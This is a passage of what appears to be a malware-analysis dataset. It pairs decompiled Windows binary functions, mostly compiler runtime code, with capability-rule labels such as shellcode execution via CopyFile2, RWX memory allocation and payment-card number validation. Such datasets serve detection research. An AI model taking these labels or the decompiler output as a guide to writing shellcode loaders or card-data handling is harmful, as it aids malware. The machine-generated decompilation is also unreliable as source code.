        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nulong fcn.140013760(char **arg1, uint32_t *arg2, uint32_t *arg3)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int64_t iVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uint32_t *puVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    int32_t iVar13;\n    int64_t iVar14;\n    uint32_t *puVar15;\n    char *pcVar16;\n    int32_t iVar17;\n    uint32_t *puVar18;\n    uint32_t *puVar19;\n    int32_t iVar20;\n    \n    iVar7 = *0x140018310;\n    if (*(*0x140018310 + 0x30) == '\\0') {\n        fcn.1400136c0();\n    }\n    uVar4 = *arg2 & 0x1f;\n    puVar11 = arg3 + (*arg2 >> 5);\n    if (uVar4 == 0) {\n        puVar10 = puVar11 + -1;\n        puVar19 = puVar11;\n    }\n    else {\n        puVar19 = puVar11 + 1;\n        puVar10 = puVar11;\n    }\n    puVar19[-1] = 0;\n    pcVar16 = *arg1;\n    uVar2 = pcVar16[1];\n    while( true ) {\n        if (uVar2 == 0) {\n            return 4;\n        }\n        if (0x20 < uVar2) break;\n        uVar2 = pcVar16[2];\n        pcVar16 = pcVar16 + 1;\n    }\n    if (((uVar2 == 0x30) && ((pcVar16[2] & 0xdfU) == 0x58)) && (uVar2 = pcVar16[3],  0x20 < uVar2)) {\n        pcVar6 = pcVar16 + 3;\n        pcVar16 = pcVar16 + 2;\n    }\n    else {\n        uVar2 = pcVar16[1];\n        pcVar6 = pcVar16 + 1;\n        if (uVar2 == 0) {\n            return 4;\n        }\n    }\n    uVar9 = uVar2;\n    iVar17 = 0;\n    iVar20 = 0;\n    iVar13 = 0;\n    puVar11 = puVar10;\n    puVar18 = puVar10;\ncode_r0x000140013830:\n    do {\n        uVar2 = *(iVar7 + uVar9);\n        if (uVar2 == 0) {\n            if (0x20 < uVar9) {\n                if ((uVar9 != 0x29) || (iVar13 == 0)) {\n                    do {\n                        pcVar6 = pcVar6 + 1;\n                        if (uVar9 == 0x29) {\n                            *arg1 = pcVar6;\n                            return 4;\n                        }\n                        uVar9 = *pcVar6;\n                    } while (*pcVar6 != 0);\n                    return 4;\n                }\n                *arg1 = pcVar16 + 2;\n                goto code_r0x0001400138d5;\n            }\n            if (iVar13 <= iVar20) {\ncode_r0x000140013a35:\n                uVar2 = pcVar6[1];\n                while (uVar2 < 0x21) {\n                    puVar1 = pcVar6 + 2;\n                    pcVar6 = pcVar6 + 1;\n                    uVar2 = *puVar1;\n                }\n                pcVar16 = pcVar6;\n                if (((uVar2 != 0x30) || ((pcVar6[2] & 0xdfU) != 0x58)) || (uVar9 = pcVar6[3],  pcVar6[3] < 0x21))\n                goto code_r0x0001400139ec;\n                pcVar16 = pcVar6 + 2;\n                pcVar6 = pcVar6 + 3;\n                goto code_r0x000140013830;\n            }\n            if ((puVar18 < puVar11) && (iVar17 < 8)) {\n                uVar8 = *puVar18;\n                cVar3 = '\\b' - iVar17;\n                puVar12 = puVar18;\n                do {\n                    puVar15 = puVar12 + 1;\n                    *puVar12 = uVar8 | puVar12[1] << (cVar3 * -4 + 0x20U & 0x1f);\n                    uVar8 = puVar12[1] >> (cVar3 * '\\x04' & 0x1fU);\n                    *puVar15 = uVar8;\n                    puVar12 = puVar15;\n                } while (puVar15 < puVar11);\n            }\n            if (arg3 < puVar18) {\n                puVar11 = puVar18 + -1;\n                puVar18[-1] = 0;\n                iVar17 = 0;\n                puVar18 = puVar11;\n                iVar20 = iVar13;\n                goto code_r0x000140013a35;\n            }\n            uVar2 = pcVar6[1];\n            iVar17 = 8;\n            pcVar16 = pcVar6;\n        }\n        else {\n            iVar17 = iVar17 + 1;\n            iVar13 = iVar13 + 1;\n            if (iVar17 < 9) {\n                uVar8 = *puVar18 << 4;\n            }\n            else {\n                pcVar16 = pcVar6;\n                if (puVar18 <= arg3) goto code_r0x0001400139ec;\n                puVar18[-1] = 0;\n                uVar8 = 0;\n                puVar18 = puVar18 + -1;\n                iVar17 = 1;\n            }\n            *puVar18 = uVar2 & 0xf | uVar8;\n            pcVar16 = pcVar6;\ncode_r0x0001400139ec:\n            uVar2 = pcVar16[1];\n        }\n        uVar9 = uVar2;\n        pcVar6 = pcVar16 + 1;\n        if (uVar2 == 0) {\n            if (iVar13 == 0) {\n                return 4;\n            }\ncode_r0x0001400138d5:\n            if ((puVar18 < puVar11) && (iVar17 < 8)) {\n                cVar3 = '\\b' - iVar17;\n                uVar8 = *puVar18;\n                puVar12 = puVar18;\n                do {\n                    puVar15 = puVar12 + 1;\n                    uVar5 = puVar12[1] << (cVar3 * -4 + 0x20U & 0x1f) | uVar8;\n                    uVar8 = puVar12[1] >> (cVar3 * '\\x04' & 0x1fU);\n                    *puVar12 = uVar5;\n                    *puVar15 = uVar8;\n                    puVar12 = puVar15;\n                } while (puVar15 < puVar11);\n            }\n            puVar11 = puVar18;\n            puVar12 = arg3;\n            if (arg3 < puVar18) {\n                do {\n                    puVar15 = puVar11 + 1;\n                    *puVar12 = *puVar11;\n                    puVar11 = puVar15;\n                    puVar12 = puVar12 + 1;\n                } while (puVar15 <= puVar10);\n                iVar7 = (puVar10 - puVar18 & 0xfffffffffffffffcU) + 4;\n                if (puVar10 + 1U < puVar18 + 1U) {\n                    iVar7 = 4;\n                }\n                iVar7 = iVar7 + arg3;\n                iVar14 = (puVar10 - iVar7 & 0xfffffffffffffffcU) + 4;\n                if (puVar10 + 1U < iVar7 + 1U) {\n                    iVar14 = 4;\n                }\n                sub.msvcrt.dll_memset(iVar7, 0, iVar14);\n                uVar8 = puVar19[-1];\n            }\n            else {\n                uVar8 = puVar19[-1];\n                if (uVar4 != 0) {\n                    uVar8 = uVar8 & 0xffffffffU >> (0x20U - uVar4 & 0x1f);\n                    puVar19[-1] = uVar8;\n                }\n            }\n            while( true ) {\n                if (uVar8 != 0) {\n                    return 5;\n                }\n                if (puVar10 == arg3) break;\n                uVar8 = puVar10[-1];\n                puVar10 = puVar10 + -1;\n            }\n            *puVar10 = 1;\n            return 5;\n        }\n    } while( true );\n}\n",
        "token_count": 2018
    },
    "140013b6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000140013c24)\n// WARNING: Removing unreachable block (ram,0x000140013c10)\n// WARNING: Removing unreachable block (ram,0x000140013c15)\n// WARNING: Removing unreachable block (ram,0x000140013c30)\n\nvoid fcn.140013b60(ulong arg1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    pcVar1 = _sym.imp.KERNEL32.dll_InitializeCriticalSection;\n    if (*0x14001bdf0 != 2) {\n        if (*0x14001bdf0 != 0) {\n            if (*0x14001bdf0 == 1) {\n                do {\n                    (*pcVar2)(1);\n                } while (*0x14001bdf0 == 1);\n                if (*0x14001bdf0 == 2) goto code_r0x000140013bee;\n            }\n            return;\n        }\n        *0x14001bdf0 = 1;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x14001be00);\n        (*pcVar1)(0x14001be28);\n        fcn.140001500(0x140013c40);\n        *0x14001bdf0 = 2;\n    }\ncode_r0x000140013bee:\n    // WARNING: Could not recover jumptable at 0x000140013c06. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg1 * 0x28 + 0x14001be00);\n    return;\n}\n",
        "token_count": 383
    },
    "14001472": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.140014720(ulong noname_0, int32_t *arg2, int32_t *arg3)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    uint8_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    ulong in_XMM0_Qa;\n    \n    iVar7 = fcn.140013c90(1);\n    if (iVar7 != 0) {\n        uVar9 = in_XMM0_Qa >> 0x20;\n        uVar10 = uVar9 & 0xfffff;\n        uVar9 = uVar9 >> 0x14 & 0x7ff;\n        if (uVar9 != 0) {\n            uVar10 = uVar10 | 0x100000;\n        }\n        uVar5 = in_XMM0_Qa;\n        if (uVar5 == 0) {\n            *(iVar7 + 0x14) = 1;\n            iVar6 = 1;\n            iVar3 = 0;\n            for (uVar5 = uVar10; (uVar5 & 1) == 0; uVar5 = uVar5 >> 1 | 0x80000000) {\n                iVar3 = iVar3 + 1;\n            }\n            iVar2 = iVar3 + 0x20;\n            *(iVar7 + 0x18) = uVar10 >> (iVar3 & 0x1f);\n        }\n        else {\n            iVar2 = 0;\n            for (uVar4 = uVar5; (uVar4 & 1) == 0; uVar4 = uVar4 >> 1 | 0x80000000) {\n                iVar2 = iVar2 + 1;\n            }\n            uVar8 = iVar2;\n            uVar5 = uVar5 >> (uVar8 & 0x1f);\n            if (iVar2 != 0) {\n                uVar5 = uVar5 | uVar10 << (0x20 - uVar8 & 0x1f);\n                uVar10 = uVar10 >> (uVar8 & 0x1f);\n            }\n            *(iVar7 + 0x18) = uVar5;\n            iVar6 = 2 - (uVar10 == 0);\n            *(iVar7 + 0x1c) = uVar10;\n            *(iVar7 + 0x14) = iVar6;\n        }\n        if (uVar9 != 0) {\n            *arg2 = (uVar9 - 0x433) + iVar2;\n            *arg3 = 0x35 - iVar2;\n            return iVar7;\n        }\n        puVar1 = iVar7 + 0x14 + iVar6 * 4;\n        uVar10 = 0x1f;\n        if (*puVar1 != 0) {\n            for (; *puVar1 >> uVar10 == 0; uVar10 = uVar10 - 1) {\n            }\n        }\n        *arg2 = iVar2 + -0x432;\n        *arg3 = iVar6 * 0x20 - (uVar10 ^ 0x1f);\n    }\n    return iVar7;\n}\n",
        "token_count": 747
    },
    "140014c9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.140014c90(uint16_t *arg1, uint32_t *arg2, int64_t arg3, uint32_t *arg4)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    uint32_t auStack28 [3];\n    \n    if (arg2 == NULL) {\n        return 0;\n    }\n    if (arg3 == 0) {\n        return 0xfffffffe;\n    }\n    auStack28[0] = *arg4;\n    uVar1 = *arg2;\n    *arg4 = 0;\n    if (uVar1 == 0) {\n        *arg1 = 0;\n        return 0;\n    }\n    if (in_stack_00000030 < 2) {\ncode_r0x000140014d48:\n        if (in_stack_00000028 == 0) {\n            *arg1 = *arg2;\n            return 1;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(in_stack_00000028, 8, arg2, 1, arg1, 1);\n        if (iVar2 != 0) {\n            return 1;\n        }\n    }\n    else {\n        if (auStack28[0] == '\\0') {\n            iVar2 = (*_sym.imp.KERNEL32.dll_IsDBCSLeadByteEx)(in_stack_00000028);\n            if (iVar2 == 0) goto code_r0x000140014d48;\n            if (arg3 == 1) {\n                *arg4 = *arg2;\n                return 0xfffffffe;\n            }\n        }\n        else {\n            auStack28[0]._0_2_ = CONCAT11(uVar1, auStack28[0]);\n            auStack28[0] = auStack28[0] & 0xffff0000 | auStack28[0];\n            arg2 = auStack28;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(in_stack_00000028, 8, arg2, 2, arg1, 1);\n        if (iVar2 != 0) {\n            return 2;\n        }\n    }\n    puVar3 = sub.msvcrt.dll__errno();\n    *puVar3 = 0x2a;\n    return 0xffffffff;\n}\n",
        "token_count": 555
    },
    "140001e0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RW memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\nvoid fcn.140001e00(uint64_t arg1)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong uVar7;\n    int64_t iVar8;\n    uint32_t *puVar9;\n    code *pcVar10;\n    uint32_t uVar11;\n    uint64_t *puVar12;\n    uint *puVar13;\n    int64_t iVar14;\n    int64_t *piVar15;\n    int32_t *piVar16;\n    int32_t iVar17;\n    uint uVar18;\n    char *arg1_00;\n    uint64_t arg2;\n    uint32_t *puVar19;\n    int64_t iVar20;\n    int64_t *arg1_01;\n    uint64_t in_R8;\n    int64_t in_R9;\n    ulong in_XMM2_Qa;\n    ulong in_XMM3_Qa;\n    ulong auStack320 [5];\n    uint auStack280 [2];\n    uint64_t auStack272 [10];\n    uchar auStack192 [8];\n    ulong uStack184;\n    int64_t iStack168;\n    int64_t iStack160;\n    ulong auStack72 [3];\n    ulong uStack48;\n    int32_t iStack36;\n    \n    iStack168 = *0x14001b0b4;\n    if (*0x14001b0b4 < 1) goto code_r0x000140001f30;\n    iVar17 = 0;\n    puVar12 = *0x14001b0b8 + 0x18;\n    do {\n        if ((*puVar12 <= arg1) && (in_R8 = *(puVar12[1] + 8),  arg1 < *puVar12 + in_R8)) {\n            return;\n        }\n        iVar17 = iVar17 + 1;\n        puVar12 = puVar12 + 5;\n    } while (iVar17 != *0x14001b0b4);\n    while (iStack160 = fcn.1400027a0(arg1),  iStack160 != 0) {\n        iStack168 = iStack168 * 0x28;\n        puVar13 = *0x14001b0b8 + iStack168;\n        *(puVar13 + 8) = iStack160;\n        *puVar13 = 0;\n        iVar14 = fcn.1400028d0();\n        iVar14 = *(iStack160 + 0xc) + iVar14;\n        *(*0x14001b0b8 + iStack168 + 0x18) = iVar14;\n        iVar14 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(iVar14, auStack72, 0x30);\n        if (iVar14 == 0) {\n            in_R8 = *(*0x14001b0b8 + iStack168 + 0x18);\n            fcn.140001d90(\"  VirtualQuery failed for %d bytes at address %p\", *(iStack160 + 8), in_R8, in_R9);\n            break;\n        }\n        if (((iStack36 - 0x40U & 0xffffffbf) == 0) || ((iStack36 - 4U & 0xfffffffb) == 0)) {\ncode_r0x000140001ecc:\n            *0x14001b0b4 = *0x14001b0b4 + 1;\n            return;\n        }\n        in_R8 = 4;\n        if (iStack36 != 2) {\n            in_R8 = 0x40;\n        }\n        in_R9 = *0x14001b0b8 + iStack168;\n        *(in_R9 + 8) = auStack72[0];\n        *(in_R9 + 0x10) = uStack48;\n        iVar17 = (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n        if (iVar17 != 0) goto code_r0x000140001ecc;\n        uVar11 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.140001d90(\"  VirtualProtect failed with code 0x%x\", uVar11, in_R8, in_R9);\ncode_r0x000140001f30:\n        iStack168 = 0;\n    }\n    arg1_00 = \"Address %p has no image-section\";\n    fcn.140001d90(\"Address %p has no image-section\", arg1, in_R8, in_R9);\n    iVar17 = *0x14001b0b0;\n    if (*0x14001b0b0 != 0) {\n        return;\n    }\n    *0x14001b0b0 = 1;\n    auStack272[5] = 0x140001faf;\n    fcn.140002820();\n    auStack272[5] = 0x140001fc6;\n    iVar14 = fcn.140002a60(arg1_00);\n    iVar20 = *0x140018320;\n    puVar9 = *0x1400182d0;\n    *0x14001b0b4 = 0;\n    iVar14 = -iVar14;\n    *0x14001b0b8 = auStack192 + iVar14;\n    if (*0x1400182d0 - *0x1400182e0 < 8) {\n        *0x14001b0b4 = 0;\n        return;\n    }\n    puVar19 = *0x1400182e0;\n    if (*0x1400182d0 - *0x1400182e0 < 0xc) {\ncode_r0x000140002003:\n        if (*puVar19 == 0) {\n            uVar11 = puVar19[1];\ncode_r0x000140002010:\n            if (uVar11 == 0) {\n                arg2 = puVar19[2];\n                if (puVar19[2] != 1) {\ncode_r0x0001400021e1:\n                    uVar18 = 0x400179a0;\n                    *(auStack272 + iVar14 + 0x28) = 0x1400021ed;\n                    fcn.140001d90(\"  Unknown pseudo relocation protocol version %d.\\n\", arg2, in_R8, in_R9);\n                    if (*0x14001b0c0 != NULL) {\n                        uVar6 = *(&uStack184 + iVar14);\n                        *(auStack280 + iVar14) = uVar18;\n                        *(auStack272 + iVar14) = arg2;\n                        *(auStack272 + iVar14 + 8) = in_XMM2_Qa;\n                        *(auStack272 + iVar14 + 0x10) = in_XMM3_Qa;\n                        *(auStack272 + iVar14 + 0x18) = uVar6;\n                        *(auStack320 + iVar14) = 0x14000222b;\n                        (**0x14001b0c0)(auStack280 + iVar14);\n                    }\n                    return;\n                }\n                puVar19 = puVar19 + 3;\n                if (*0x1400182d0 <= puVar19) {\n                    *0x14001b0b4 = 0;\n                    return;\n                }\n                do {\n                    while( true ) {\n                        uVar2 = *(puVar19 + 2);\n                        arg2 = uVar2;\n                        piVar15 = *puVar19 + iVar20;\n                        arg1_01 = puVar19[1] + iVar20;\n                        iVar5 = *piVar15;\n                        if (uVar2 != 0x20) break;\n                        iVar4 = *arg1_01;\n                        *(auStack272 + iVar14 + 0x28) = 0x140002194;\n                        fcn.140001e00(arg1_01);\n                        *arg1_01 = iVar5 + (iVar4 - piVar15);\ncode_r0x00014000206c:\n                        puVar19 = puVar19 + 3;\n                        if (puVar9 <= puVar19) goto code_r0x0001400020d8;\n                    }\n                    if (0x20 < uVar2) {\n                        if (uVar2 == 0x40) {\n                            iVar8 = *arg1_01;\n                            *(auStack272 + iVar14 + 0x28) = 0x14000216a;\n                            fcn.140001e00(arg1_01);\n                            *arg1_01 = iVar5 + (iVar8 - piVar15);\n                            goto code_r0x00014000206c;\n                        }\ncode_r0x0001400021d5:\n                        *(auStack272 + iVar14 + 0x28) = 0x1400021e1;\n                        fcn.140001d90(\"  Unknown pseudo relocation bit size %d.\\n\", arg2, in_R8, in_R9);\n                        goto code_r0x0001400021e1;\n                    }\n                    if (uVar2 == 8) {\n                        uVar2 = *arg1_01;\n                        in_R8 = uVar2 | 0xffffffffffffff00;\n                        *(auStack272 + iVar14 + 0x28) = 0x140002069;\n                        fcn.140001e00(arg1_01);\n                        *arg1_01 = iVar5 + (uVar2 - piVar15);\n                        goto code_r0x00014000206c;\n                    }\n                    if (uVar2 != 0x10) goto code_r0x0001400021d5;\n                    uVar3 = *arg1_01;\n                    in_R8 = uVar3 | 0xffffffffffff0000;\n                    puVar19 = puVar19 + 3;\n                    *(auStack272 + iVar14 + 0x28) = 0x1400020ca;\n                    fcn.140001e00(arg1_01);\n                    *arg1_01 = iVar5 + (uVar3 - piVar15);\n                } while (puVar19 < puVar9);\n                goto code_r0x0001400020d8;\n            }\n        }\n    }\n    else if (**0x1400182e0 == 0) {\n        uVar11 = (*0x1400182e0)[1];\n        if ((uVar11 | (*0x1400182e0)[2]) == 0) {\n            puVar19 = *0x1400182e0 + 3;\n            goto code_r0x000140002003;\n        }\n        goto code_r0x000140002010;\n    }\n    if (*0x1400182d0 <= puVar19) {\n        *0x14001b0b4 = 0;\n        return;\n    }\n    do {\n        puVar1 = puVar19 + 1;\n        uVar11 = *puVar19;\n        puVar19 = puVar19 + 2;\n        piVar16 = *puVar1 + iVar20;\n        iVar4 = *piVar16;\n        *(auStack272 + iVar14 + 0x28) = 0x1400021c8;\n        fcn.140001e00(piVar16);\n        *piVar16 = uVar11 + iVar4;\n    } while (puVar19 < puVar9);\ncode_r0x0001400020d8:\n    pcVar10 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    if (0 < *0x14001b0b4) {\n        iVar20 = 0;\n        do {\n            piVar16 = *0x14001b0b8 + iVar20;\n            iVar4 = *piVar16;\n            if (iVar4 != 0) {\n                uVar6 = *(piVar16 + 4);\n                uVar7 = *(piVar16 + 2);\n                *(auStack272 + iVar14 + 0x28) = 0x140002117;\n                (*pcVar10)(uVar7, uVar6, iVar4, &uStack184 + 4);\n            }\n            iVar17 = iVar17 + 1;\n            iVar20 = iVar20 + 0x28;\n        } while (iVar17 < *0x14001b0b4);\n    }\n    return;\n}\n",
        "token_count": 2716
    },
    "14000991": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nbool fcn.140009910(int32_t **arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg2;\n    bool bVar3;\n    \n    arg2 = *arg1;\n    if (arg2 + 3U < 4) {\n        arg2 = fcn.140009570(arg1, arg2);\n    }\n    if (arg2 == NULL) {\n        return 0xc;\n    }\n    if (arg2[1] != 0) {\n        if (*arg2 == 0) {\n            return 0x16;\n        }\n        iVar2 = arg2[5];\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar2 != iVar1) {\n            return true;\n        }\n        if (arg2[4] != 0) {\n            arg2[4] = arg2[4] + -1;\n            return false;\n        }\n        arg2[5] = -1;\n    }\n    iVar2 = *arg2;\n    *arg2 = 0;\n    bVar3 = false;\n    if (iVar2 == 2) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(arg2 + 2));\n        bVar3 = iVar2 == 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 297
    },
    "1400099d": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.1400099d0(int32_t **arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg2;\n    ulong uVar3;\n    \n    arg2 = *arg1;\n    if (arg2 + 3U < 4) {\n        arg2 = fcn.140009570(arg1, arg2);\n    }\n    if (arg2 == NULL) {\n        return 0xc;\n    }\n    LOCK();\n    if (*arg2 == 0) {\n        *arg2 = 1;\n        uVar3 = 0;\n        if (arg2[1] != 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            arg2[5] = iVar1;\n            return 0;\n        }\n    }\n    else if ((arg2[1] == 2) &&\n            (iVar1 = arg2[5],  iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)(),  iVar1 == iVar2)) {\n        arg2[4] = arg2[4] + 1;\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 0x10;\n    }\n    return uVar3;\n}\n",
        "token_count": 278
    },
    "140013c9": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.140013c90(ulong arg1)\n\n{\n    int32_t iVar1;\n    ulong *puVar2;\n    uint64_t uVar3;\n    int32_t iVar4;\n    \n    fcn.140013b60(0);\n    iVar1 = *0x14001bdf0;\n    if (arg1 < 10) {\n        puVar2 = *(arg1 * 8 + 0x14001bda0);\n        if (puVar2 != NULL) {\n            *(arg1 * 8 + 0x14001bda0) = *puVar2;\n            goto joined_r0x000140013d11;\n        }\n        iVar4 = 1 << (arg1 & 0x1f);\n        uVar3 = iVar4 * 4 + 0x23U >> 3 & 0xffffffff;\n        if (0x120 < (*0x140016100 + -0x28003694 >> 3) + uVar3) goto code_r0x000140013ca4;\n        puVar2 = *0x140016100;\n        *0x140016100 = *0x140016100 + uVar3;\n    }\n    else {\ncode_r0x000140013ca4:\n        iVar4 = 1 << (arg1 & 0x1f);\n        puVar2 = sub.msvcrt.dll_malloc(iVar4 * 4 + 0x23U & 0x7fffffff8);\n        if (puVar2 == NULL) {\n            return;\n        }\n    }\n    iVar1 = *0x14001bdf0;\n    *(puVar2 + 1) = arg1;\n    *(puVar2 + 0xc) = iVar4;\njoined_r0x000140013d11:\n    if (iVar1 == 2) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x14001be00);\n    }\n    puVar2[2] = 0;\n    return;\n}\n",
        "token_count": 436
    },
    "140013d9": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.140013d90(ulong *arg1)\n\n{\n    ulong uVar1;\n    bool bVar2;\n    \n    if (arg1 != NULL) {\n        if (9 < *(arg1 + 1)) {\n    // WARNING: Could not recover jumptable at 0x000140014be0. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)();\n            return;\n        }\n        fcn.140013b60(0);\n        bVar2 = *0x14001bdf0 == 2;\n        uVar1 = *(*(arg1 + 1) * 8 + 0x14001bda0);\n        *(*(arg1 + 1) * 8 + 0x14001bda0) = arg1;\n        *arg1 = uVar1;\n        if (bVar2) {\n    // WARNING: Could not recover jumptable at 0x000140013ded. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x14001be00);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 264
    },
    "140013eb": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.140013eb0(ulong arg1)\n\n{\n    int32_t iVar1;\n    ulong *puVar2;\n    \n    fcn.140013b60(0);\n    if (*0x14001bda8 == NULL) {\n        if ((*0x140016100 + -0x28003694 >> 3) + 5U < 0x121) {\n            puVar2 = *0x140016100;\n            *0x140016100 = *0x140016100 + 5;\n        }\n        else {\n            puVar2 = sub.msvcrt.dll_malloc(0x28);\n            if (puVar2 == NULL) {\n                return;\n            }\n        }\n        iVar1 = *0x14001bdf0;\n        puVar2[1] = 0x200000001;\n    }\n    else {\n        puVar2 = *0x14001bda8;\n        *0x14001bda8 = **0x14001bda8;\n        iVar1 = *0x14001bdf0;\n    }\n    if (iVar1 == 2) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x14001be00);\n    }\n    *(puVar2 + 3) = arg1;\n    puVar2[2] = 0x100000000;\n    return;\n}\n",
        "token_count": 298
    },
    "1400140d": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong * fcn.1400140d0(ulong *arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    ulong *puVar4;\n    ulong *arg2_00;\n    bool bVar5;\n    \n    if (((arg2 & 3) == 0) || (arg1 = fcn.140013e00(arg1, *(((arg2 & 3) - 1) * 4 + 0x140018140), 0),  arg1 != NULL)) {\n        arg2._0_4_ = arg2 >> 2;\n        if (arg2 != 0) {\n            puVar4 = *0x14001b480;\n            pcVar3 = _sym.imp.KERNEL32.dll_LeaveCriticalSection;\n            if (*0x14001b480 == NULL) {\n                fcn.140013b60(1);\n                puVar4 = *0x14001b480;\n                if (*0x14001b480 == NULL) {\n                    puVar4 = fcn.140013c90(1);\n                    if (puVar4 == NULL) {\n                        *0x14001b480 = NULL;\n                        return NULL;\n                    }\n                    *0x14001b480 = puVar4;\n                    *(puVar4 + 0x14) = 0x27100000001;\n                    *puVar4 = 0;\n                }\n                pcVar3 = _sym.imp.KERNEL32.dll_LeaveCriticalSection;\n                if (*0x14001bdf0 == 2) {\n                    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x14001be28);\n                    pcVar3 = _sym.imp.KERNEL32.dll_LeaveCriticalSection;\n                }\n            }\n            while( true 